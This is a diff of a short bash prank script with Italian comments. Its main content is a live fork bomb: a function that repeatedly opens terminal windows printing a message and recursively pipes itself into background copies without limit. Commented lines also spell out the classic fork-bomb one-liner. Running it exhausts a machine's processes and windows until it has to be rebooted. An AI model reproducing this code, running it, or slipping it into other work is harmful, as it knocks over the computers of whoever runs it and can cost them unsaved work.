@@ -20,17 +20,15 @@ read -t 20 tmp;
 TERM=xterm
 # choosing terminal
 # default Unix system under gnome
-which gnome-terminal &> /dev/null
+type gnome-terminal &> /dev/null
 [ $? -eq 0 ] && TERM=gnome-terminal
-# default under mac
-which Terminal &> /dev/null
-[ $? -eq 0 ] && TERM=Terminal
 
 fork_bomb() {
     text_to_show="$@"
     # esegui in background il comando in altri terminali
-    # gnome-terminal -e "bash -c ':() { : | : & }; while true; do :; done; sleep infinity'" &> /dev/null &
-    $TERM -e "bash -c 'for el in {1..20}; do echo $text_to_show; done; sleep infinity'" &&
+    # gnome-terminal -e "bash -c 'fork_bomb() { fork_bomb | fork_bomb & }; while true; do fork_bomb; done; sleep infinity'" &> /dev/null &
+    # TODO under mac OS must create file.command with following line and execute the script file with command open
+    $TERM -e "bash -c 'for el in {1..20}; do echo $text_to_show; done; sleep infinity'"
     # invia l'output come input della funzione stessa ed esegui il tutto in background
     fork_bomb | fork_bomb &
 }
